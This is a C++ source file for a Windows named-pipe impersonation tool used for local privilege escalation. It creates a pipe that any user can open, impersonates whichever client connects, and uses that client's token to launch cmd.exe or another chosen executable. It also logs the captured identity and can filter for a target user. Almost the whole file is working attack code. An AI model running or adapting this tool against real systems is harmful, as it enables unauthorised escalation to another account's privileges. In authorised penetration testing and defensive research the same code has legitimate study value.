// creds to MinatoTW for his implementation that was used as a reference
// https://github.com/MinatoTW/NamedPipeImpersonation


#include <windows.h> 
#include <stdio.h> 
#include <tchar.h>
#include <strsafe.h>
#include <string>
#include <iostream>
#include <sstream>
#include <fstream>
#include <aclapi.h>
#include <sddl.h>
#include <psapi.h>

#define BUFSIZE 0x1000

BOOL logToFile = FALSE;
std::wstring logfilePath;


PCHAR wideStringToNarrow(PWCHAR originalWide) {

	// convert the WCHAR string to char *

	size_t origsize = wcslen(originalWide) + 1;
	size_t convertedChars = 0;
	const size_t newsize = origsize * 2;
	char* newNarrow = new char[newsize];
	wcstombs_s(&convertedChars, newNarrow, newsize, originalWide, _TRUNCATE);
	return newNarrow;
}


BOOLEAN strstr_i(PCHAR a, PCHAR b) {

	// checks if string b is substring of string a
	// case insensitive

	BOOLEAN result = FALSE;

	PCHAR al = (PCHAR)malloc(strlen(a) + 1);
	PCHAR bl = (PCHAR)malloc(strlen(b) + 1);

	if (al == NULL || bl == NULL) {
		return FALSE;
	}

	strcpy_s(al, strlen(a) + 1, a);
	strcpy_s(bl, strlen(b) + 1, b);

	_strlwr_s(al, strlen(al) + 1);
	_strlwr_s(bl, strlen(bl) + 1);

	result = (strstr(al, bl) != NULL);

	free(al);
	free(bl);

	return result;
}


BOOLEAN strstr_i(PWCHAR a, PWCHAR b) {

	PCHAR an = wideStringToNarrow(a);
	PCHAR bn = wideStringToNarrow(b);
	BOOLEAN result = strstr_i(an, bn);
	free(an);
	free(bn);
	return result;
}


std::wstring GetLastErrorStdStr(DWORD error) {

	// returns the string description of GetLastError()

	if (error) {
		LPVOID lpMsgBuf;
		DWORD bufLen = FormatMessageA(
			FORMAT_MESSAGE_ALLOCATE_BUFFER |
			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS,
			NULL,
			error,
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			(LPSTR)&lpMsgBuf,
			0, NULL);

		if (bufLen) {
			LPCSTR lpMsgStr = (LPCSTR)lpMsgBuf;
			std::wstring result(lpMsgStr, lpMsgStr + bufLen - 1);

			LocalFree(lpMsgBuf);

			return L"GLE: " + std::to_wstring(error) + L", " + result;
		}
	}
	return L"GLE: " + std::to_wstring(error) + L", failed to get error description";
}


std::wstring GetLastErrorStdStr() {
	DWORD err = GetLastError();
	return GetLastErrorStdStr(err);
}


BOOL EnableWindowsPrivilege(LPCWSTR Privilege)
{
	// Tries to enable privilege if it is present to the Permissions set

	LUID luid = {};
	TOKEN_PRIVILEGES tp;
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE currentToken = {};
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;
	if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken)) return FALSE;
	if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) return FALSE;
	return TRUE;
}


BOOL CheckWindowsPrivilege(LPCWSTR Privilege)
{
	// Checks for Privilege and returns True or False

	LUID luid;
	PRIVILEGE_SET privs;
	HANDLE hProcess;
	HANDLE hToken;
	hProcess = GetCurrentProcess();
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) return FALSE;
	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) return FALSE;
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	BOOL bResult;
	PrivilegeCheck(hToken, &privs, &bResult);
	return bResult;
}


DWORD getTokenImpersonationLevel(HANDLE hToken) {

	PSECURITY_IMPERSONATION_LEVEL pImpersonationLevel = NULL;
	DWORD dwTokenImpersonationLevelSize = 0;

	GetTokenInformation(
		hToken,
		TokenImpersonationLevel,
		NULL,
		dwTokenImpersonationLevelSize,
		&dwTokenImpersonationLevelSize
	);
	if (dwTokenImpersonationLevelSize == 0) {
		std::wcout << "GetTokenInformation failed; " << GetLastErrorStdStr() << "\n";
	}

	pImpersonationLevel = (PSECURITY_IMPERSONATION_LEVEL)malloc(dwTokenImpersonationLevelSize);

	if (GetTokenInformation(
		hToken,
		TokenImpersonationLevel,
		pImpersonationLevel,
		dwTokenImpersonationLevelSize,
		&dwTokenImpersonationLevelSize
	) == 0) {
		std::wcout << "GetTokenInformation failed; " << GetLastErrorStdStr() << "\n";
	}

	SECURITY_IMPERSONATION_LEVEL impersonationLevel = *pImpersonationLevel;

	free(pImpersonationLevel);
	return (DWORD)impersonationLevel;
}


std::wstring getTokenSidString(HANDLE hToken) {

	PTOKEN_USER pTokenUser = NULL;
	DWORD pTokenUserSize = 0;
	std::wstring result = std::wstring();

	GetTokenInformation(
		hToken,
		TokenUser,
		NULL,
		pTokenUserSize,
		&pTokenUserSize
	);
	if (pTokenUserSize == 0) {
		std::wcout << "getTokenSidString GetTokenInformation failed; " << GetLastErrorStdStr() << "\n";
		return result;
	}

	pTokenUser = (PTOKEN_USER)malloc(pTokenUserSize);

	if (GetTokenInformation(
		hToken,
		TokenUser,
		pTokenUser,
		pTokenUserSize,
		&pTokenUserSize
	) == 0) {
		std::wcout << "getTokenSidStringGetTokenInformation failed; " << GetLastErrorStdStr() << "\n";
		return result;
	}

	LPWSTR stringSid = (LPWSTR)malloc(1024);

	if (ConvertSidToStringSidW(
		pTokenUser->User.Sid,
		&stringSid
	) == 0) {
		std::wcout << "getTokenSidString ConvertSidToStringSidA failed; " << GetLastErrorStdStr() << "\n";
		free(stringSid);
		return NULL;
	}

	result = std::wstring(stringSid);
	return result;
}


std::wstring getNameFromSid(HANDLE hToken) {

	DWORD usernameLen = 0;
	DWORD domainNameLen = 0;
	LPWSTR username = NULL;
	LPWSTR domainName = NULL;
	SID_NAME_USE sidType;
	PTOKEN_USER pTokenUser = NULL;
	DWORD pTokenUserSize = 0;
	std::wstringstream result;

	GetTokenInformation(
		hToken,
		TokenUser,
		NULL,
		pTokenUserSize,
		&pTokenUserSize
	);
	if (pTokenUserSize == 0) {
		std::wcout << "getTokenSidString GetTokenInformation failed; " << GetLastErrorStdStr() << "\n";
		return result.str();
	}

	pTokenUser = (PTOKEN_USER)malloc(pTokenUserSize);

	if (GetTokenInformation(
		hToken,
		TokenUser,
		pTokenUser,
		pTokenUserSize,
		&pTokenUserSize
	) == 0) {
		std::wcout << "getTokenSidStringGetTokenInformation failed; " << GetLastErrorStdStr() << "\n";
		return result.str();
	}

	LookupAccountSid(
		NULL,
		pTokenUser->User.Sid,
		username,
		&usernameLen,
		domainName,
		&domainNameLen,
		&sidType
	);

	if (usernameLen == 0) {
		return result.str();
	}

	username = (LPWSTR)malloc(usernameLen * sizeof(wchar_t));
	domainName = (LPWSTR)malloc(domainNameLen * sizeof(wchar_t));

	if (LookupAccountSid(
		NULL,
		pTokenUser->User.Sid,
		username,
		&usernameLen,
		domainName,
		&domainNameLen,
		&sidType
	) == 0) {
		goto exit;
	}

	result << domainName << "\\" << username;
	free(username);
	free(domainName);

exit:
	return result.str();
}


std::wstring GetProcessNameFromPID(DWORD processID)
{
	std::wstring pname = L"unknown";
	WCHAR szProcessName[MAX_PATH];

	// Get a handle to the process.

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID);

	// Get the process name.

	if (NULL != hProcess)
	{
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
			&cbNeeded))
		{
			GetModuleFileNameExW(hProcess, hMod, szProcessName, MAX_PATH);
			pname = std::wstring(szProcessName);
		}
	}
	else {
		std::wcout << "can not open client process; " << GetLastErrorStdStr() << "\n";
	}

	CloseHandle(hProcess);
	return pname.c_str();
}


// class to log output to both stdout and logfile
class DoubleOutSteam {
public:

	std::wofstream logFileStream;

	DoubleOutSteam() {

	}

	DoubleOutSteam(std::wstring logFilePath) {
		logFileStream = std::wofstream(logFilePath, std::ofstream::out | std::ofstream::app);
		logFileStream.flush();
	}

	void close() {
		logFileStream.close();
	}
};


template <class T>
DoubleOutSteam& operator<< (DoubleOutSteam& st, T val)
{
	if (logToFile) {
		st.logFileStream << val;
	}
	std::wcout << val;
	return st;
}


void printUsage(wchar_t* argv[]) {
	std::wcout << "usage: " << argv[0] << " -p <full pipe name> [options] [-e <full path to executable>]\n";
	std::wcout << "options:\n";
	std::wcout << "\t-p,--pipe: path to the named pipe\n";
	std::wcout << "\t-e,--executable: path to the executable to run with the impersonated token's privileges; default = cmd.exe\n";
	std::wcout << "\t-u,--user: username to target; default = any\n";
	std::wcout << "\t-l,--logfile: output log file path\n";
	std::wcout << "\t-k,--keep: keep listening on the pipe; does not run the executable specified with --executable\n";
}


int wmain(int argc, wchar_t* argv[], wchar_t* envp[]) {

	BOOL fConnected = FALSE;
	BOOL keepListening = FALSE;
	DWORD dwThreadId = 0;
	HANDLE hPipe = INVALID_HANDLE_VALUE;
	LPCTSTR lpszPipename = NULL;
	PWCHAR targetUser = NULL;
	PWCHAR payloadExec = (PWCHAR)L"C:\\Windows\\System32\\cmd.exe";
	std::stringstream logString;
	DoubleOutSteam dout;


	for (int i = 1; i < argc; i++) {
		if (wcscmp(argv[i], L"-p") == 0 || wcscmp(argv[i], L"--pipe") == 0) {
			lpszPipename = argv[++i];
		}
		else if (wcscmp(argv[i], L"-e") == 0 || wcscmp(argv[i], L"--executable") == 0) {
			payloadExec = argv[++i];
		}
		else if (wcscmp(argv[i], L"-u") == 0 || wcscmp(argv[i], L"--username") == 0) {
			targetUser = argv[++i];
		}
		else if (wcscmp(argv[i], L"-l") == 0 || wcscmp(argv[i], L"--logfile") == 0) {
			logToFile = TRUE;
			logfilePath = std::wstring(argv[++i]);
		}
		else if (wcscmp(argv[i], L"-k") == 0 || wcscmp(argv[i], L"--keep") == 0) {
			keepListening = TRUE;
		}
		else {
			printUsage(argv);
			return 1;
		}
	}

	if (lpszPipename == NULL) {
		std::wcout << "Error: pipe name not specified\n";
		printUsage(argv);
		return 1;
	}

	if (logToFile) {
		dout = DoubleOutSteam(logfilePath);
	}

	if (!CheckWindowsPrivilege(SE_IMPERSONATE_NAME)) {
		dout << "No SeImpersonatePrivilege is granted!";
		return 1;
	}

	if (!EnableWindowsPrivilege(SE_IMPERSONATE_NAME)) {
		dout << "EnableWindowsPrivilege error!";
		return 1;
	}

	BOOLEAN done = FALSE;
	LPVOID pchRequest = malloc(BUFSIZE * sizeof(TCHAR));
	SECURITY_DESCRIPTOR sd;
	InitializeSecurityDescriptor(&sd, 1);
	SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
	SECURITY_ATTRIBUTES sa;
	sa.lpSecurityDescriptor = &sd;

	while (!done) {

		hPipe = CreateNamedPipe(
			lpszPipename,             // pipe name 
			PIPE_ACCESS_DUPLEX,       // read/write access 
			PIPE_TYPE_MESSAGE |       // message type pipe 
			PIPE_READMODE_MESSAGE |   // message-read mode 
			PIPE_WAIT,                // blocking mode 
			PIPE_UNLIMITED_INSTANCES, // max. instances  
			BUFSIZE,                  // output buffer size 
			BUFSIZE,                  // input buffer size 
			0,                        // client time-out 
			&sa);                    // default security attribute 

		if (hPipe == INVALID_HANDLE_VALUE) {
			dout << "CreateNamedPipe failed; " << GetLastErrorStdStr() << "\n";
			dout << "CreateNamedPipe failed; " << GetLastErrorStdStr() << "\n";
			return 1;
		}

		dout << "\nAwaiting client connection on " << lpszPipename << "\n";

		// wait for the client to connect

		fConnected = ConnectNamedPipe(hPipe, NULL) ?
			TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);

		if (fConnected) {
			dout << "Client connected\n";

			DWORD cbBytesRead = 0;
			BOOL fSuccess = FALSE;

			// read some data from the client
			// it is required that the clients writes something to the pipe
			// before token impersonation can take place

			fSuccess = ReadFile(
				hPipe,
				pchRequest,
				BUFSIZE,
				&cbBytesRead,
				NULL
			);

			if (!fSuccess || cbBytesRead == 0) {
				if (GetLastError() == ERROR_BROKEN_PIPE) {
					dout << "InstanceThread: client disconnected.\n";
				}
				else {
					dout << "InstanceThread ReadFile failed; " << GetLastErrorStdStr() << "\n";
				}
				CloseHandle(hPipe);
				continue;
			}

			if (ImpersonateNamedPipeClient(hPipe) == 0) {
				dout << "ImpersonateNamedPipeClient failed; " << GetLastErrorStdStr() << "\n";
			}
			else {

				dout << "ImpersonateNamedPipeClient succeeded!\n";

				HANDLE threadToken;

				if (OpenThreadToken(
					GetCurrentThread(),
					TOKEN_ALL_ACCESS,
					FALSE,
					&threadToken
				) == 0) {
					dout << "OpenThreadToken failed; " << GetLastErrorStdStr() << "\n";
					CloseHandle(hPipe);
					continue;
				}

				// get token impersonation level

				DWORD impersonationLevel = getTokenImpersonationLevel(threadToken);
				if (impersonationLevel == -1) {
					dout << "can not get impersonation level\n";
				}
				else {
					switch ((SECURITY_IMPERSONATION_LEVEL)impersonationLevel) {
					case SecurityAnonymous:
						dout << "Token level: SecurityAnonymous\n";
						break;
					case SecurityIdentification:
						dout << "Token level: SecurityIdentification\n";
						break;
					case SecurityImpersonation:
						dout << "Token level: SecurityImpersonation\n";
						break;
					case SecurityDelegation:
						dout << "Token level: SecurityDelegation\n";
						break;
					default:
						break;
					}
				}

				// get token user SID

				std::wstring tokenSidString = getTokenSidString(threadToken);
				if (!tokenSidString.empty()) {
					dout << "Token user SID: " << tokenSidString << "\n";
				}

				// get token user

				std::wstring tokenUsernameString = getNameFromSid(threadToken);
				if (!tokenUsernameString.empty()) {
					dout << "Token username: " << tokenUsernameString << "\n";
				}

				if ((targetUser == NULL) || (targetUser != NULL && strstr_i((PWCHAR)tokenUsernameString.c_str(), targetUser))) {

					ULONG cpid = 0;
					GetNamedPipeClientProcessId(hPipe, &cpid);
					dout << L"PID: " << cpid << L"\n";
					std::wstring cname = GetProcessNameFromPID(cpid);
					dout << L"Process name: " << cname.c_str() << L"\n";

					if (keepListening) {
						continue;
					}

					STARTUPINFOW si;
					PROCESS_INFORMATION pi;
					RtlSecureZeroMemory(&pi, sizeof(pi));
					RtlSecureZeroMemory(&si, sizeof(si));
					si.cb = sizeof(si);
					RevertToSelf();
					Sleep(3);

					// launch privileged command

					if (CreateProcessWithTokenW(
						threadToken,
						0,
						payloadExec,
						NULL,
						0,
						NULL,
						NULL,
						&si,
						&pi
					) == 0) {
						dout << "CreateProcessWithTokenW failed; " << GetLastErrorStdStr() << "\n";
						CloseHandle(hPipe);
						continue;
					}

					printf("Exiting.\n");
					done = TRUE;
				}
				else {
					dout << "Skipping... \n\n";
				}
			}
			
		}

		CloseHandle(hPipe);
	}
	free(pchRequest);
	dout.close();
	return 0;
}